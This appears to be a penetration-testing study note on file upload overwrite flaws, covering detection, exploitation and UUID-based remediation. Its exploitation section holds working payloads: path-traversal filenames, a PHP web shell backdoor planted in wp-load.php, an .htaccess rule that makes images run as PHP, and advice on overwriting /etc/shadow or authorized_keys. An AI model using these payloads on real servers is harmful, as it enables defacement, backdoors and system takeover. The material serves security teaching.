---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.14 Overwriting Existing Files"
---

# 22.14 — Overwriting Existing Files

## What is it?
When implementing file upload functionality, developers must decide what happens if a user uploads a file with a name that already exists on the server. If the application does not automatically rename the incoming file or reject the upload, it will overwrite the existing file. 

If an attacker can control the filename (and optionally use path traversal), they can overwrite critical application files. This might include overwriting the site's `index.php` to deface the website, overwriting configuration files (`.htaccess`, `web.config`) to disable security controls, or overwriting legitimate application scripts to backdoor the platform.

Think of it like a filing cabinet where folders are organized by name. If you hand the clerk a new folder named "Payroll Data" and tell them to file it, an insecure clerk will just throw away the old "Payroll Data" folder and replace it with yours, allowing you to rewrite company history.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Uploads file: filename="../../../index.php"
   │    Content: <?php system('whoami'); ?>
   ▼
[Web Application (Vulnerable Upload Logic)]
   │
   │ 2. Accepts filename without generating a random UUID
   │ 3. Resolves path: /var/www/uploads/../../../index.php -> /var/www/index.php
   │ 4. Checks if file exists. It does!
   │ 5. Overwrites the existing index.php with attacker's file
   ▼
[File System]
   │
[Legitimate User]
   │
   │ 6. Visits https://target.com/
   ▼
[Web Server] ─── 7. Executes the newly overwritten index.php -> Site Defaced / RCE!
```

## How to Find It
- **Manual steps:**
  1. Upload a harmless text file named `test.txt`.
  2. Verify that `test.txt` is accessible and read its contents.
  3. Upload a completely different text file, but name it `test.txt` again.
  4. Access `test.txt` via the browser. If the contents have changed to your second file, the application is vulnerable to file overwriting.
  5. Combine this with Path Traversal (`../../test.txt`) to see if you can overwrite files outside the upload directory.

- **Tool commands with flags explained:**
  You can quickly test overwrite behavior using `curl`:
  ```bash
  # Upload first file
  echo "VERSION 1" > test.txt
  curl -F "file=@test.txt" https://target.com/upload
  
  # Upload second file with same name
  echo "VERSION 2" > test.txt
  curl -F "file=@test.txt" https://target.com/upload
  
  # Check which version the server retained
  curl https://target.com/uploads/test.txt
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Map the web application's directory structure (often using `gobuster` or by reading open source code if it's a known CMS like WordPress).
  2. Identify a critical, executable file that you want to overwrite (e.g., `header.php`, `index.jsp`, `.htaccess`).
  3. Create your malicious version of that file. Ensure it still performs its normal function so as not to alert administrators immediately, but add your backdoor code.
  4. Intercept the upload request and use Path Traversal in the `filename` parameter to point to the target file.
  5. Submit the upload to overwrite the target.

- **Actual payloads:**
  **Overwriting Apache `.htaccess` to enable PHP:**
  ```text
  filename="../../.htaccess"
  Content:
  AddType application/x-httpd-php .jpg
  ```
  
  **Overwriting a known CMS file (e.g., WordPress `wp-load.php`):**
  ```text
  filename="../../../wp-load.php"
  Content:
  <?php
  // Legitimate code goes here
  // ...
  // Attacker backdoor
  if(isset($_GET['cmd'])){ system($_GET['cmd']); die; }
  ?>
  ```

- **Real HTTP request/response examples:**
  **Upload Request:**
  ```http
  POST /api/upload HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="document"; filename="../../../var/www/html/index.php"
  Content-Type: application/x-php

  <?php echo "HACKED BY VAPT"; ?>
  ------WebKitFormBoundary--
  ```
  **Response:**
  ```http
  HTTP/1.1 200 OK
  
  File saved successfully.
  ```

## Real-World Example
In a known vulnerability within a popular forum software, users could upload attachment files. The software checked extensions to prevent `.php` uploads, but it did not prevent users from uploading files named `.user.ini`. Furthermore, the software did not rename files; it just saved them directly. An attacker uploaded a file named `.user.ini` containing the directive `auto_prepend_file=backdoor.gif`. Because `.user.ini` already existed in the directory (or was read by the PHP engine if placed there), the attacker successfully overwrote the PHP configuration, causing every PHP file in that directory to load the attacker's hidden payload first.

## How to Fix It
- **Developer remediation:**
  Never trust the user-provided filename. The absolute best way to prevent file overwriting is to completely discard the user's filename and generate a unique, random identifier (like a UUID) for the file when saving it to the disk. If you absolutely must keep the original filename (e.g., for user downloads), store the file on disk using a UUID, and map the UUID to the original filename in a database.

- **Code snippet:**
  **Python (Generating UUIDs prevents overwrites):**
  ```python
  import uuid
  import os
  from werkzeug.utils import secure_filename

  def save_file(uploaded_file):
      # DO NOT USE: filename = secure_filename(uploaded_file.filename)
      # Secure filename strips directory traversal, but DOES NOT prevent overwrites!
      
      # INSTEAD, discard the name and generate a UUID
      extension = os.path.splitext(uploaded_file.filename)[1]
      safe_filename = str(uuid.uuid4()) + extension
      
      save_path = os.path.join('/var/uploads/', safe_filename)
      uploaded_file.save(save_path)
  ```

## Chaining Opportunities
- This vuln + [[07 - File Upload + Path Traversal]] → File overwriting is rarely useful on its own if uploads are restricted to a safe directory. By chaining it with Path Traversal (`../../`), you can escape the safe directory and overwrite core application files.
- This vuln + [[Missing File Permissions / Sudo Privileges]] → If the web server runs as `root` (a severe misconfiguration), use this vulnerability to overwrite `/etc/shadow` or `/root/.ssh/authorized_keys` to achieve total SSH access to the machine.

## Related Notes
- [[07 - File Upload + Path Traversal]]
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
